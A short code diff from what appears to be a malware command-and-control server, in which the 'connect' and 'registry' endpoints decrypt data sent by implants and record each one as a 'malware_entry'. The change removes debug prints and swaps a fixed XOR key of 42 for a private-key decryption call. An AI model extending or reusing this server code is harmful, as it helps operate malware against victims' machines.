@@ -22,8 +22,6 @@ def connect():
 
     json_payload = request.get_json()
 
-    print(json_payload)
-
     key = fileOps.get_enc_key(json_payload["id"])
 
     dec = encode.xor_decrypt(json_payload['data'], key)
@@ -40,11 +38,9 @@ def registry():
 
     json_payload = request.get_json()
 
-    dec = encode.xor_decrypt(json_payload['data'], 42)
-
+    dec = encode.decrypt_message_priv(json_payload['data'])
+    
     data_json = json.loads(dec)
-
-    print(data_json)
 
     malware_entry = {
         "id": malwareRegistry,
